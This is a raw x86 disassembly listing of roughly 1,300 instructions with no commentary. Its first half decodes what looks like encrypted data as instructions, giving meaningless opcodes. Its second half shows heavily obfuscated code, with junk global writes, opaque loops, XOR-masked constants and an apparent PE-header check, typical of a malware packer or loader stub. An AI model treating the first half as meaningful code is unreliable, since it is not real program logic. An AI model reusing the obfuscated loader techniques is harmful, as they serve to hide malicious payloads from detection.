  40ce0d:	leave  
  40ce0e:	in     al,0xfe
  40ce10:	out    dx,al
  40ce11:	cli    
  40ce12:	in     eax,0x12
  40ce14:	(bad)  
  40ce15:	lods   al,BYTE PTR ds:[esi]
  40ce16:	(bad)  
  40ce17:	mul    dh
  40ce19:	retf   0xc3eb
  40ce1c:	(bad)
  40ce1f:	mov    bh,0xc8
  40ce21:	mov    dh,0xce
  40ce23:	retf   0xe8ec
  40ce26:	pop    es
  40ce27:	icebp  
  40ce28:	fcmovnb st,st(1)
  40ce2a:	sar    ebp,1
  40ce2c:	rcr    dl,cl
  40ce2e:	sysret 
  40ce30:	or     ecx,ebx
  40ce32:	add    ecx,edx
  40ce34:	fucom  st(7)
  40ce36:	mov    edi,0xd6cfcdca
  40ce3b:	jecxz  0x40cdf4
  40ce3d:	into   
  40ce3e:	stc    
  40ce3f:	test   dh,0xe5
  40ce42:	cli    
  40ce43:	xlat   BYTE PTR ds:[ebx]
  40ce44:	aad    0xbb
  40ce46:	icebp  
  40ce47:	(bad)  
  40ce48:	std    
  40ce49:	loope  0x40ce2f
  40ce4b:	(bad)  
  40ce4c:	stc    
  40ce4d:	jecxz  0x40ce23
  40ce4f:	call   0xd43d994a
  40ce54:	into   
  40ce55:	out    0xef,al
  40ce57:	(bad)  
  40ce58:	lock mov cl,0xcf
  40ce5b:	rol    dh,1
  40ce5d:	shr    BYTE PTR [esi-0x7210d2c],0xda
  40ce64:	fdivp  st(7),st
  40ce66:	in     eax,dx
  40ce67:	mov    ebp,0xe20300c1
  40ce6c:	retf   
  40ce6d:	(bad)  
  40ce6f:	in     eax,0xf6
  40ce71:	push   cs
  40ce72:	or     eax,0xf3c6c8ca
  40ce77:	test   eax,0xd2e4c4ce
  40ce7c:	int3   
  40ce7d:	in     al,0xf8
  40ce7f:	lods   eax,DWORD PTR ds:[esi]
  40ce80:	mov    bh,0xd1
  40ce82:	mov    esp,0xb8c2f5f1
  40ce87:	sti    
  40ce88:	rol    DWORD PTR [eax],1
  40ce8a:	inc    BYTE PTR [ecx]
  40ce8c:	or     edi,esp
  40ce8e:	ffreep st(6)
  40ce90:	fimul  DWORD PTR [edx]
  40ce92:	adc    ecx,DWORD PTR [ebx]
  40ce94:	sar    DWORD PTR [eax-0x2c2d293e],cl
  40ce9a:	shr    ah,1
  40ce9c:	int    0xcb
  40ce9e:	repz aam 0xb9
  40cea1:	retf   
  40cea2:	in     al,0x3
  40cea4:	cmc    
  40cea5:	in     eax,dx
  40cea6:	mov    edi,0xd8d300f1
  40ceab:	in     al,0xa
  40cead:	or     bh,ah
  40ceaf:	(bad)  
  40ceb0:	out    dx,al
  40ceb1:	into   
  40ceb2:	fmul   DWORD PTR [ebx+ecx*1]
  40ceb5:	into   
  40ceb6:	(bad)  
  40ceb7:	(bad)  
  40ceb9:	cmc    
  40ceba:	rcr    ebx,cl
  40cebc:	jmp    0x40ceb2
  40cebe:	xlat   BYTE PTR ds:[ebx]
  40cebf:	cli    
  40cec0:	lock inc ah
  40cec3:	cmc    
  40cec4:	loop   0x40ce9d
  40cec6:	add    edx,edi
  40cec8:	mov    esp,0xf2d5bdf7
  40cecd:	mov    DWORD PTR [edi],0xc90d02df
  40ced3:	fst    st(3)
  40ced5:	jmp    0x40ce89
  40ced7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ced8:	fmul   st(0),st
  40ceda:	lock in al,dx
  40cedc:	out    0xcf,al
  40cede:	cmc    
  40cedf:	lods   eax,DWORD PTR ds:[esi]
  40cee0:	fdivp  st(2),st
  40cee2:	mov    esp,0xc3b7caba
  40cee7:	hlt    
  40cee8:	cld    
  40cee9:	(bad)  
  40ceea:	shl    dl,1
  40ceec:	jmp    0xe848d2c9
  40cef1:	jecxz  0x40cef5
  40cef3:	repnz add BYTE PTR [ebx-0x2c16504d],ch
  40cefa:	out    dx,al
  40cefb:	(bad)  
  40cefc:	enter  0xfaea,0xfe
  40cf00:	clc    
  40cf01:	iret   
  40cf02:	into   
  40cf03:	xlat   BYTE PTR ds:[ebx]
  40cf04:	sar    eax,cl
  40cf06:	add    edx,esp
  40cf08:	push   es
  40cf09:	add    eax,DWORD PTR [eax]
  40cf0b:	add    eax,0xfee9d0d1
  40cf10:	shr    ch,0xf8
  40cf13:	out    dx,eax
  40cf14:	cld    
  40cf15:	vpsrlw xmm6,xmm1,XMMWORD PTR [esi-0x18531f0c]
  40cf1d:	in     al,dx
  40cf1e:	retf   0xfbf3
  40cf21:	cmc    
  40cf22:	clc    
  40cf23:	out    dx,eax
  40cf24:	fcom   st(1)
  40cf26:	stc    
  40cf27:	fild   WORD PTR ds:0xc5e2e1d6
  40cf2d:	push   es
  40cf2e:	call   0xe028a909
  40cf33:	repnz stc 
  40cf35:	int    0xe4
  40cf37:	iret   
  40cf38:	imul   esp
  40cf3a:	leave  
  40cf3b:	mov    bl,0xb3
  40cf3d:	shl    dl,0xfa
  40cf40:	rol    ch,cl
  40cf42:	mov    edx,0xccd8fcf3
  40cf47:	mov    eax,0x2cc0700
  40cf4c:	add    al,0xeb
  40cf4e:	fcomip st,st(5)
  40cf50:	(bad)  
  40cf51:	(bad)  
  40cf54:	icebp  
  40cf55:	int3   
  40cf56:	call   0xd103bc19
  40cf5b:	ret    
  40cf5c:	(bad)  
  40cf5d:	repnz loopne 0x40cf44
  40cf60:	repz in eax,dx
  40cf62:	mov    ch,0xcc
  40cf64:	mov    ecx,0xfabeb9f2
  40cf69:	sti    
  40cf6a:	add    edi,DWORD PTR [ebx+ebx*8+0x4e5d40a]
  40cf71:	or     al,0xfa
  40cf73:	ror    DWORD PTR [esi],0xc0
  40cf76:	retf   0xc0eb
  40cf79:	(bad)
  40cf7c:	fsincos 
  40cf7e:	out    0xda,al
  40cf80:	fxch   st(0)
  40cf82:	out    dx,al
  40cf83:	retf   0xf1fe
  40cf86:	mov    esp,0xd0f100cc
  40cf8b:	fistp  QWORD PTR [edx+eiz*8-0x13021442]
  40cf92:	(bad)  
  40cf93:	cli    
  40cf94:	shr    al,cl
  40cf96:	shl    DWORD PTR [edx-0x2b191411],0xdb
  40cf9d:	stc    
  40cf9e:	jmp    0xf0ca:0xdecdd9eb
  40cfa5:	stc    
  40cfa6:	sti    
  40cfa7:	ror    dh,cl
  40cfa9:	in     al,dx
  40cfaa:	aad    0xc6
  40cfac:	test   eax,0xfccae5f5
  40cfb2:	fucom  st(2)
  40cfb4:	push   es
  40cfb5:	loop   0x40cf95
  40cfb7:	in     eax,0xdc
  40cfb9:	in     al,dx
  40cfba:	jmp    0xed0db9b0
  40cfbf:	lods   eax,DWORD PTR ds:[esi]
  40cfc0:	mov    dh,0xbd
  40cfc2:	into   
  40cfc3:	jmp    0x40cfbe
  40cfc5:	cmc    
  40cfc6:	idiv   BYTE PTR [esi+ebx*8-0x251a3d40]
  40cfcd:	xlat   BYTE PTR ds:[ebx]
  40cfce:	aad    0xdc
  40cfd0:	loop   0x40cfde
  40cfd2:	add    bh,ch
  40cfd4:	retf   0xe3cb
  40cfd7:	mov    al,0xce
  40cfd9:	vpaddsw ymm6,ymm5,ymm2
  40cfdd:	out    0xd7,eax
  40cfdf:	(bad)  
  40cfe0:	ror    ebp,cl
  40cfe2:	aam    0xe3
  40cfe4:	mov    ah,0x1
  40cfe6:	add    bh,dh
  40cfe8:	in     eax,dx
  40cfe9:	aad    0xd5
  40cfeb:	add    al,0xf8
  40cfed:	sar    ebx,1
  40cfef:	jmp    0x40cff8
  40cff1:	loope  0x40cfdd
  40cff3:	repz repz int3 
  40cff6:	mov    al,0xcc
  40cff8:	scas   al,BYTE PTR es:[edi]
  40cff9:	in     eax,dx
  40cffa:	mov    ebp,0xb7fbfac9
  40d000:	mov    eax,0xd6bfdbf0
  40d005:	in     eax,dx
  40d006:	xlat   BYTE PTR ds:[ebx]
  40d007:	into   
  40d008:	repz jecxz 0x40cfd0
  40d00b:	shl    ebp,0xfa
  40d00e:	(bad)
  40d011:	retf   
  40d012:	fucomp st(1)
  40d014:	enter  0xe0a8,0xcd
  40d018:	scas   al,BYTE PTR es:[edi]
  40d019:	test   ch,0xcd
  40d01c:	mul    al
  40d01e:	repz lock int 0xb8
  40d022:	fild   WORD PTR [ebx]
  40d024:	sti    
  40d025:	in     al,dx
  40d026:	clc    
  40d027:	mov    ebp,0xe3f6f5da
  40d02c:	ret    0xdff4
  40d02f:	add    dh,ch
  40d031:	aam    0xfc
  40d033:	iret   
  40d034:	add    eax,0xd1efcce3
  40d039:	mov    ch,0xb3
  40d03b:	shr    al,cl
  40d03d:	mov    dh,0xcb
  40d03f:	in     al,0xb9
  40d041:	retf   0xfdbe
  40d044:	fidivr WORD PTR [ebp-0x180d2212]
  40d04a:	mov    BYTE PTR ds:0xcafedf06,0xe7
  40d051:	hlt    
  40d052:	in     al,dx
  40d053:	int3   
  40d054:	(bad)  
  40d056:	jmp    0x40d049
  40d058:	jmp    0xb9ca:0xebd1caac
  40d05f:	in     al,dx
  40d060:	(bad)  
  40d061:	fcomip st,st(3)
  40d063:	mov    eax,0xcff702f2
  40d068:	jecxz  0x40d03b
  40d06a:	sar    bh,0xf7
  40d06d:	or     bh,dh
  40d06f:	(bad)  
  40d070:	(bad)  
  40d072:	std    
  40d073:	jmp    0x40d041
  40d075:	mov    eax,0xd6bcb0dc
  40d07a:	out    0xc7,eax
  40d07c:	loopne 0x40d044
  40d07e:	lock mov cl,0xf2
  40d081:	sar    al,1
  40d083:	enter  0xc1ee,0xd1
  40d087:	cld    
  40d088:	sar    bh,1
  40d08a:	sti    
  40d08b:	repnz mov esi,0x5c90b09
  40d092:	call   ebx
  40d094:	shr    BYTE PTR [esi-0x512e481c],cl
  40d09a:	div    ebx
  40d09c:	(bad)  
  40d09d:	into   
  40d09e:	(bad)  
  40d09f:	jmp    0x40d06a
  40d0a1:	cli    
  40d0a2:	call   0xd244c5a9
  40d0a7:	rcl    eax,0xfb
  40d0aa:	jmp    0x40d0a9
  40d0ac:	fdiv   st(5),st
  40d0ae:	add    al,bh
  40d0b0:	in     eax,0xde
  40d0b2:	loopne 0x40d075
  40d0b4:	adc    ebp,esp
  40d0b6:	fsubr  DWORD PTR [ebp-0x4f491c2e]
  40d0bc:	loope  0x40d072
  40d0be:	fdiv   DWORD PTR [eax-0x23363231]
  40d0c4:	mov    ebx,0xc102f702
  40d0c9:	icebp  
  40d0ca:	test   BYTE PTR [edx],0xf0
  40d0cd:	inc    DWORD PTR ds:0xd9cbe8ee
  40d0d3:	(bad)  
  40d0d4:	in     eax,dx
  40d0d5:	retf   0xe7a9
  40d0d8:	mov    dh,0xf5
  40d0da:	mov    cl,0xc6
  40d0dc:	rol    edi,1
  40d0de:	rcl    bl,1
  40d0e0:	mov    ecx,0xd5dcb6fd
  40d0e5:	not    al
  40d0e7:	out    0xd5,al
  40d0e9:	rcl    edi,0xf2
  40d0ec:	ret    0x8bf
  40d0ef:	xlat   BYTE PTR ds:[ebx]
  40d0f0:	fmul   st(5),st
  40d0f2:	jecxz  0x40d0f7
  40d0f4:	into   
  40d0f5:	loope  0x40d0b6
  40d0f7:	lods   eax,DWORD PTR ds:[esi]
  40d0f8:	out    0xe6,al
  40d0fa:	xlat   BYTE PTR ds:[ebx]
  40d0fb:	shl    dl,1
  40d0fd:	cli    
  40d0fe:	jmp    0x3d3:0xcffaedce
  40d105:	xlat   BYTE PTR ds:[ebx]
  40d106:	repnz out 0xf2,eax
  40d109:	(bad)  
  40d10a:	sar    edi,cl
  40d10c:	add    DWORD PTR [eax],eax
  40d10e:	mov    eax,0xe807f4e0
  40d114:	out    0xe1,eax
  40d116:	shl    DWORD PTR [edi-0x3a4a3f51],cl
  40d11c:	loopne 0x40d106
  40d11e:	iret   
  40d11f:	in     eax,0xbe
  40d121:	mov    bh,0xcf
  40d123:	into   
  40d124:	sti    
  40d125:	enter  0xdde0,0x5
  40d129:	vpsubq ymm0,ymm0,ymm0
  40d12d:	(bad)  
  40d12e:	call   0x103caa2c
  40d133:	jmp    0xc8eeb62b
  40d138:	mov    ebp,0xfbccaab2
  40d13d:	test   bh,0xcc
  40d140:	lock fcmovnbe st,st(5)
  40d143:	int    0xcf
  40d145:	cli    
  40d146:	rcr    al,cl
  40d148:	loopne 0x40d12a
  40d14a:	lock fdivrp st(1),st
  40d14d:	add    al,0xf5
  40d14f:	add    al,0xfb
  40d151:	jecxz  0x40d15e
  40d153:	fiadd  WORD PTR [ecx]
  40d155:	shr    DWORD PTR [edx-0x34423853],1
  40d15b:	(bad)
  40d15e:	mov    dh,0xe8
  40d160:	in     eax,0xb9
  40d162:	fidiv  DWORD PTR [ebp-0x90730ff]
  40d168:	rcr    ecx,cl
  40d16a:	push   es
  40d16b:	(bad)  
  40d16d:	jmp    0x40d14f
  40d16f:	call   0xfb3aa14c
  40d174:	jmp    0xb32b8065
  40d179:	in     al,dx
  40d17a:	mov    dl,0xf3
  40d17c:	(bad)  
  40d17d:	fdiv   DWORD PTR [edx-0x14120536]
  40d183:	icebp  
  40d184:	hlt    
  40d185:	icebp  
  40d186:	add    ebp,esp
  40d188:	mov    eax,0xf8d4bae6
  40d18d:	aad    0xd0
  40d18f:	test   esp,0xc0ffcfe9
  40d195:	test   al,0xd0
  40d197:	rcl    bl,1
  40d199:	into   
  40d19a:	jmp    0xf711c248
  40d19f:	rcl    esi,1
  40d1a1:	idiv   BYTE PTR [ecx-0x3e3efc1e]
  40d1a7:	cld    
  40d1a8:	int3   
  40d1a9:	ret    0xf6e3
  40d1ac:	(bad)  
  40d1ad:	fmul   DWORD PTR [edi]
  40d1af:	or     esp,edx
  40d1b1:	fcom   DWORD PTR [ebx]
  40d1b3:	push   es
  40d1b4:	loop   0x40d1a9
  40d1b6:	ret    
  40d1b7:	jmp    0xe1d6:0xe7bccdce
  40d1be:	lock repz mov dh,0xcb
  40d1c2:	cld    
  40d1c3:	mov    eax,0xf6cec3be
  40d1c8:	mov    ah,0xe6
  40d1ca:	fidivr DWORD PTR [ecx-0x110a1c10]
  40d1d0:	cld    
  40d1d1:	jmp    0x40d1df
  40d1d3:	sti    
  40d1d4:	or     esi,ebx
  40d1d6:	les    esi,FWORD PTR [eax-0x2f1c3039]
  40d1dc:	mov    bh,0xc9
  40d1de:	retf   
  40d1df:	rcr    edi,cl
  40d1e1:	mov    ebx,0xd1d7fab6
  40d1e6:	mov    ecx,0xf505bcf5
  40d1eb:	pop    es
  40d1ec:	aam    0xfd
  40d1ee:	leave  
  40d1ef:	(bad)  
  40d1f0:	ffree  st(4)
  40d1f2:	or     esp,esi
  40d1f4:	add    ch,ch
  40d1f6:	ret    0xe3e4
  40d1f9:	mov    cl,0xd7
  40d1fb:	shl    ebp,1
  40d1fd:	int3   
  40d1fe:	leave  
  40d1ff:	aam    0xd7
  40d201:	stc    
  40d202:	fnstsw WORD PTR [ebp-0x3fd0237]
  40d208:	mov    esi,0xd9dde3e6
  40d20d:	mov    DWORD PTR [ebx],0xe2c7c8e0
  40d213:	fist   DWORD PTR [ebx]
  40d215:	retf   0xbdb1
  40d218:	out    0xc4,al
  40d21a:	mov    bl,0xf6
  40d21c:	repz mov ah,0xf3
  40d21f:	out    dx,eax
  40d220:	mov    bh,0xfb
  40d222:	in     al,dx
  40d223:	mov    eax,0xd3cff5fe
  40d228:	add    eax,eax
  40d22a:	add    eax,0x5424137
  40d22f:	adc    ecx,0x0
  40d232:	mov    ecx,DWORD PTR [ebp-0x4]
  40d235:	mov    ecx,DWORD PTR [ecx]
  40d237:	xor    ecx,eax
  40d239:	mov    eax,DWORD PTR [ebp-0x4]
  40d23c:	mov    DWORD PTR [eax],ecx
  40d23e:	mov    eax,DWORD PTR [ebp+0x14]
  40d241:	mov    eax,DWORD PTR [eax]
  40d243:	mov    DWORD PTR [ebp-0x38],eax
  40d246:	mov    eax,DWORD PTR [ebp-0x38]
  40d249:	mov    eax,DWORD PTR [eax]
  40d24b:	mov    ecx,DWORD PTR [ebp-0x4]
  40d24e:	mov    ecx,DWORD PTR [ecx]
  40d250:	xor    edx,edx
  40d252:	sub    ecx,0x5424137
  40d258:	sbb    edx,0x0
  40d25b:	xor    ecx,0x8a29a14b
  40d261:	xor    edx,0x0
  40d264:	xor    ecx,0x8a29a14b
  40d26a:	xor    edx,0x0
  40d26d:	add    ecx,0x5424137
  40d273:	adc    edx,0x0
  40d276:	mov    eax,DWORD PTR [eax]
  40d278:	xor    esi,esi
  40d27a:	add    eax,ecx
  40d27c:	adc    esi,edx
  40d27e:	mov    ecx,DWORD PTR [ebp-0x38]
  40d281:	mov    ecx,DWORD PTR [ecx]
  40d283:	mov    DWORD PTR [ecx],eax
  40d285:	mov    eax,DWORD PTR [ebp-0xc]
  40d288:	mov    DWORD PTR [eax],0x70941f81
  40d28e:	mov    DWORD PTR [eax+0x4],0xffffffff
  40d295:	mov    eax,DWORD PTR [ebp-0x18]
  40d298:	mov    ecx,DWORD PTR [ebp-0x14]
  40d29b:	mov    DWORD PTR [ebp-0x40],eax
  40d29e:	mov    DWORD PTR [ebp-0x3c],ecx
  40d2a1:	cmp    DWORD PTR [ebp-0x40],0x70941f81
  40d2a8:	jne    0x40d342
  40d2ae:	cmp    DWORD PTR [ebp-0x3c],0xffffffff
  40d2b2:	jne    0x40d342
  40d2b8:	mov    eax,DWORD PTR [ebp-0x4]
  40d2bb:	mov    eax,DWORD PTR [eax]
  40d2bd:	xor    ecx,ecx
  40d2bf:	sub    eax,0x5424137
  40d2c4:	sbb    ecx,0x0
  40d2c7:	xor    eax,0x8a29a14b
  40d2cc:	xor    ecx,0x0
  40d2cf:	mov    edx,DWORD PTR [ebp+0x8]
  40d2d2:	xor    edx,0x75108b5
  40d2d8:	add    edx,0x3272fb
  40d2de:	xor    esi,esi
  40d2e0:	sub    edx,0x5424137
  40d2e6:	sbb    esi,0x0
  40d2e9:	xor    edx,0x8a29a14b
  40d2ef:	xor    esi,0x0
  40d2f2:	mov    DWORD PTR [ebp-0x48],eax
  40d2f5:	mov    DWORD PTR [ebp-0x44],ecx
  40d2f8:	mov    DWORD PTR [ebp-0x50],edx
  40d2fb:	mov    DWORD PTR [ebp-0x4c],esi
  40d2fe:	mov    eax,DWORD PTR [ebp-0x48]
  40d301:	cmp    eax,DWORD PTR [ebp-0x50]
  40d304:	jne    0x40d342
  40d30a:	mov    eax,DWORD PTR [ebp-0x44]
  40d30d:	cmp    eax,DWORD PTR [ebp-0x4c]
  40d310:	jne    0x40d342
  40d316:	mov    eax,DWORD PTR [ebp-0x4]
  40d319:	mov    eax,DWORD PTR [eax]
  40d31b:	xor    ecx,ecx
  40d31d:	sub    eax,0x5424137
  40d322:	sbb    ecx,0x0
  40d325:	xor    eax,0x8a29a14b
  40d32a:	xor    ecx,0x0
  40d32d:	xor    eax,0x8a29a14b
  40d332:	xor    ecx,0x0
  40d335:	add    eax,0x5424137
  40d33a:	adc    ecx,0x0
  40d33d:	mov    ecx,DWORD PTR [ebp-0x8]
  40d340:	mov    DWORD PTR [ecx],eax
  40d342:	pop    esi
  40d343:	leave  
  40d344:	ret    0x10
  40d347:	push   ebp
  40d348:	mov    ebp,esp
  40d34a:	sub    esp,0x144
  40d350:	sub    DWORD PTR ds:0x437723,0x4cfe
  40d35a:	push   ebx
  40d35b:	or     eax,DWORD PTR ds:0x437783
  40d361:	push   esi
  40d362:	mov    DWORD PTR [ebp-0x3c],0xf89c85b0
  40d369:	or     eax,0x788f
  40d36e:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  40d375:	mov    eax,DWORD PTR [ebp-0x3c]
  40d378:	xor    eax,0x75108b5
  40d37d:	mov    DWORD PTR ds:0x437727,0x3e42
  40d387:	add    eax,0x3272fb
  40d38c:	mov    DWORD PTR [ebp-0x28],eax
  40d38f:	cmp    DWORD PTR [ebp+0x14],0x0
  40d393:	mov    DWORD PTR ds:0x4377a3,0x7433
  40d39d:	je     0x40d3c5
  40d3a3:	adc    DWORD PTR ds:0x437743,ebx
  40d3a9:	mov    eax,DWORD PTR [ebp+0x14]
  40d3ac:	adc    DWORD PTR ds:0x437777,0x7bf4
  40d3b6:	mov    eax,DWORD PTR [eax]
  40d3b8:	mov    DWORD PTR ds:0x437753,0x6d3d
  40d3c2:	mov    DWORD PTR [ebp-0x28],eax
  40d3c5:	dec    DWORD PTR ds:0x43775f
  40d3cb:	mov    eax,DWORD PTR [ebp-0x3c]
  40d3ce:	sbb    DWORD PTR ds:0x437783,0x437787
  40d3d8:	xor    eax,0x75108b5
  40d3dd:	adc    DWORD PTR ds:0x437767,0x43775f
  40d3e7:	add    eax,0x3272fb
  40d3ec:	mov    DWORD PTR [ebp-0x2c],eax
  40d3ef:	sub    DWORD PTR ds:0x43774f,edx
  40d3f5:	mov    eax,DWORD PTR [ebp-0x40]
  40d3f8:	or     DWORD PTR ds:0x43778f,0x43774b
  40d402:	xor    eax,0x75108b5
  40d407:	add    DWORD PTR ds:0x43772f,0x43771f
  40d411:	add    eax,0x3272fb
  40d416:	adc    DWORD PTR ds:0x4377a3,0x39ac
  40d420:	mov    DWORD PTR [ebp-0x4],eax
  40d423:	sub    DWORD PTR ds:0x437743,0x27b7
  40d42d:	mov    eax,DWORD PTR [ebp-0x3c]
  40d430:	sbb    DWORD PTR ds:0x4377a7,0x43779f
  40d43a:	xor    eax,0x75108b5
  40d43f:	add    eax,0x3272fb
  40d444:	mov    DWORD PTR [ebp-0x8],eax
  40d447:	movzx  eax,BYTE PTR ds:0x43779b
  40d44e:	xor    DWORD PTR ds:0x437753,eax
  40d454:	mov    eax,DWORD PTR [ebp-0x3c]
  40d457:	xor    eax,0x75108b5
  40d45c:	add    eax,0x3272fb
  40d461:	mov    DWORD PTR ds:0x437723,0x519f
  40d46b:	mov    DWORD PTR [ebp-0x44],eax
  40d46e:	jmp    0x40d503
  40d473:	mov    eax,DWORD PTR [ebp-0x40]
  40d476:	xor    eax,0x75108b5
  40d47b:	mov    DWORD PTR ds:0x437737,0x12
  40d485:	cmp    DWORD PTR ds:0x437737,0x0
  40d48c:	je     0x40d4e4
  40d492:	cmp    DWORD PTR ds:0x437737,0x2
  40d499:	jb     0x40d4e4
  40d49f:	jmp    0x40d4b8
  40d4a4:	push   DWORD PTR [ebp-0x14]
  40d4a7:	push   DWORD PTR [ebp-0x14]
  40d4aa:	push   0x43776f
  40d4af:	push   DWORD PTR [ebp-0x14]
  40d4b2:	call   DWORD PTR ds:0x43c99c
  40d4b8:	cmp    DWORD PTR ds:0x437737,0x3
  40d4bf:	jne    0x40d4d2
  40d4c5:	mov    ecx,DWORD PTR ds:0x437737
  40d4cb:	dec    ecx
  40d4cc:	mov    DWORD PTR ds:0x437737,ecx
  40d4d2:	mov    ecx,DWORD PTR ds:0x437737
  40d4d8:	dec    ecx
  40d4d9:	mov    DWORD PTR ds:0x437737,ecx
  40d4df:	jmp    0x40d485
  40d4e4:	mov    ecx,DWORD PTR [ebp-0x44]
  40d4e7:	lea    eax,[ecx+eax*1+0x3272fb]
  40d4ee:	mov    ecx,DWORD PTR ds:0x43771b
  40d4f4:	sub    ecx,DWORD PTR ds:0x43779f
  40d4fa:	mov    DWORD PTR ds:0x43771b,ecx
  40d500:	mov    DWORD PTR [ebp-0x44],eax
  40d503:	and    DWORD PTR ds:0x4377bb,0x0
  40d50d:	jmp    0x40d521
  40d512:	xor    ecx,ecx
  40d514:	or     ecx,DWORD PTR ds:0x4377bb
  40d51a:	inc    ecx
  40d51b:	mov    DWORD PTR ds:0x4377bb,ecx
  40d521:	cmp    DWORD PTR ds:0x4377bb,0x1b
  40d528:	jae    0x40d57e
  40d52e:	cmp    DWORD PTR ds:0x4377bb,0x9
  40d535:	jb     0x40d57e
  40d53b:	jmp    0x40d55f
  40d540:	push   0x407a
  40d545:	push   0x6d74
  40d54a:	push   0x48da
  40d54f:	push   0x6ac6
  40d554:	push   0x6e05
  40d559:	call   DWORD PTR ds:0x43c9a0
  40d55f:	cmp    DWORD PTR ds:0x4377bb,0x8
  40d566:	jne    0x40d579
  40d56c:	mov    ecx,DWORD PTR ds:0x4377bb
  40d572:	inc    ecx
  40d573:	mov    DWORD PTR ds:0x4377bb,ecx
  40d579:	jmp    0x40d512
  40d57e:	mov    eax,DWORD PTR [ebp-0x44]
  40d581:	and    DWORD PTR ds:0x437777,0x0
  40d58b:	xor    ecx,ecx
  40d58d:	xor    ecx,DWORD PTR ds:0x437777
  40d593:	inc    ecx
  40d594:	mov    DWORD PTR ds:0x437777,ecx
  40d59a:	cmp    DWORD PTR ds:0x437777,0x1b
  40d5a1:	jb     0x40d5c9
  40d5a7:	jmp    0x40d5bc
  40d5ac:	push   0x80b4
  40d5b1:	push   0x2f38
  40d5b6:	call   DWORD PTR ds:0x43c9a4
  40d5bc:	cmp    DWORD PTR ds:0x437777,0x13
  40d5c3:	jb     0x40d58b
  40d5c9:	sub    eax,0x3272fb
  40d5ce:	sbb    DWORD PTR ds:0x43776f,edx
  40d5d4:	xor    eax,0x75108b5
  40d5d9:	sbb    ecx,DWORD PTR ds:0x43775b
  40d5df:	mov    ecx,DWORD PTR [ebp-0x4]
  40d5e2:	sub    ecx,0x3272fb
  40d5e8:	sbb    DWORD PTR ds:0x4377b3,0x1661
  40d5f2:	xor    ecx,0x75108b5
  40d5f8:	mov    DWORD PTR ds:0x437723,0x6ceb
  40d602:	cmp    eax,ecx
  40d604:	mov    DWORD PTR ds:0x43770f,0xe30
  40d60e:	je     0x4125fe
  40d614:	mov    eax,DWORD PTR [ebp-0x3c]
  40d617:	xor    eax,0x75108b5
  40d61c:	add    eax,0x3272fb
  40d621:	cmp    DWORD PTR [ebp-0x44],eax
  40d624:	mov    DWORD PTR ds:0x43778b,0x71e8
  40d62e:	jne    0x40de86
  40d634:	mov    DWORD PTR ds:0x437783,0x16
  40d63e:	cmp    DWORD PTR ds:0x437783,0x0
  40d645:	je     0x40d696
  40d64b:	cmp    DWORD PTR ds:0x437783,0x4
  40d652:	jg     0x40d696
  40d658:	jmp    0x40d66b
  40d65d:	push   0x28fc
  40d662:	push   DWORD PTR [ebp-0x20]
  40d665:	call   DWORD PTR ds:0x43c9a8
  40d66b:	cmp    DWORD PTR ds:0x437783,0x5
  40d672:	jne    0x40d683
  40d678:	mov    eax,ds:0x437783
  40d67d:	dec    eax
  40d67e:	mov    ds:0x437783,eax
  40d683:	xor    eax,eax
  40d685:	xor    eax,DWORD PTR ds:0x437783
  40d68b:	dec    eax
  40d68c:	mov    ds:0x437783,eax
  40d691:	jmp    0x40d63e
  40d696:	mov    eax,DWORD PTR [ebp+0x8]
  40d699:	mov    DWORD PTR [ebp-0x58],eax
  40d69c:	mov    DWORD PTR ds:0x43775f,0x4c77
  40d6a6:	mov    DWORD PTR [ebp-0x50],0xf89c85b0
  40d6ad:	mov    eax,DWORD PTR [ebp-0x58]
  40d6b0:	or     DWORD PTR ds:0x43775b,0x43776f
  40d6ba:	movsx  eax,BYTE PTR [eax]
  40d6bd:	cdq    
  40d6be:	xor    DWORD PTR ds:0x437753,0x4377bb
  40d6c8:	sub    eax,0x5424137
  40d6cd:	mov    DWORD PTR ds:0x43775f,0x3435
  40d6d7:	sbb    edx,0x0
  40d6da:	xor    eax,0x8a29a14b
  40d6df:	and    DWORD PTR ds:0x43776f,0x4377ab
  40d6e9:	xor    edx,0x0
  40d6ec:	mov    DWORD PTR ds:0x43773f,0x124f
  40d6f6:	mov    DWORD PTR [ebp-0x144],eax
  40d6fc:	mov    DWORD PTR [ebp-0x140],edx
  40d702:	mov    DWORD PTR ds:0x4377ab,0x7835
  40d70c:	cmp    DWORD PTR [ebp-0x144],0x70941e5d
  40d716:	mov    DWORD PTR ds:0x43776f,0x724a
  40d720:	jne    0x40d88d
  40d726:	mov    DWORD PTR ds:0x43778b,0x6e67
  40d730:	cmp    DWORD PTR [ebp-0x140],0xffffffff
  40d737:	mov    DWORD PTR ds:0x43778f,0x1a8
  40d741:	jne    0x40d88d
  40d747:	adc    ecx,0x38df
  40d74d:	mov    eax,DWORD PTR [ebp-0x58]
  40d750:	and    ecx,DWORD PTR ds:0x437787
  40d756:	mov    ecx,DWORD PTR [ebp-0x58]
  40d759:	add    ecx,DWORD PTR [eax+0x3c]
  40d75c:	and    DWORD PTR ds:0x43771f,0x0
  40d766:	xor    eax,eax
  40d768:	add    eax,DWORD PTR ds:0x43771f
  40d76e:	inc    eax
  40d76f:	mov    ds:0x43771f,eax
  40d774:	cmp    DWORD PTR ds:0x43771f,0xd
  40d77b:	ja     0x40d7bb
  40d781:	jmp    0x40d796
  40d786:	push   0x43772b
  40d78b:	push   0x5f6b
  40d790:	call   DWORD PTR ds:0x43c9ac
  40d796:	cmp    DWORD PTR ds:0x43771f,0xc
  40d79d:	jne    0x40d7ae
  40d7a3:	mov    eax,ds:0x43771f
  40d7a8:	inc    eax
  40d7a9:	mov    ds:0x43771f,eax
  40d7ae:	cmp    DWORD PTR ds:0x43771f,0x18
  40d7b5:	jb     0x40d766
  40d7bb:	mov    DWORD PTR [ebp-0x54],ecx
  40d7be:	and    DWORD PTR ds:0x437777,ebx
  40d7c4:	mov    eax,DWORD PTR [ebp-0x50]
  40d7c7:	and    DWORD PTR ds:0x43778b,0x0
  40d7d1:	mov    ecx,DWORD PTR ds:0x43778b
  40d7d7:	inc    ecx
  40d7d8:	mov    DWORD PTR ds:0x43778b,ecx
  40d7de:	cmp    DWORD PTR ds:0x43778b,0xb
  40d7e5:	ja     0x40d823
  40d7eb:	jmp    0x40d7fc
  40d7f0:	push   DWORD PTR [ebp-0x24]
  40d7f3:	push   DWORD PTR [ebp-0x1c]
  40d7f6:	call   DWORD PTR ds:0x43c9b0
  40d7fc:	cmp    DWORD PTR ds:0x43778b,0xa
  40d803:	jne    0x40d816
